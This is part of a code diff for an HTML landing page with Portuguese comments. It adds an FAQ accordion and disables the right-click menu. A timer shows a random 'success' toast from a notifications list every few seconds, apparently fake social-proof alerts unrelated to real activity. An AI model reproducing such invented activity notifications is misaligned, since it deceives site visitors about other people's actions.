+            const isActive = item.classList.contains("active");
+
+            // Fecha todos os itens
+            faqItems.forEach((faqItem) => {
+              faqItem.classList.remove("active");
+            });
+
+            // Se o item clicado não estava ativo, ativa-o
+            if (!isActive) {
+              item.classList.add("active");
+            }
+          });
+        });
+      });
+
+      // Desabilitar menu de contexto (opcional)
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+
+    <script src="./config/principais.js"></script>
+    <script src="./config/textos.js"></script>
+    <script src="./config/imagens.js"></script>
+    <script src="./config/links.js"></script>
+    <script src="./config/perguntas_frequentes.js"></script>
+    <script src="./config/cores.js"></script>
+    <script src="./config/notificaoes.js"></script>
+    <script src="./config/comentarios.js"></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+
+
+function chooseRandomMessage() {
+			const randomInex = Math.floor(Math.random() * NOTIFICACOES.length);
+			return NOTIFICACOES[randomInex];
+		}
+		function showNotifications(text) {
+			if (!Swal.isVisible()) {
+              const Toast = Swal.mixin({
+                toast: true,
+                position: "top-end",
+                showConfirmButton: false,
+                timer: 3000,
+                timerProgressBar: true,
+                didOpen: (toast) => {
+                  toast.onmouseenter = Swal.stopTimer;
+                  toast.onmouseleave = Swal.resumeTimer;
+                }
+              });
+
+            Toast.fire({
+              icon: "success",
+              title: text
+            });
+			}
+		}
+
+		setInterval(() => {
+			const randomText = chooseRandomMessage();
+			showNotifications(randomText);
+		}, INTERVALO_ENTRE_NOTIFICACOES * 1000);
+    </script>
+
+    <script src="./public/render.js"></script>
+
+  </body>
+</html>
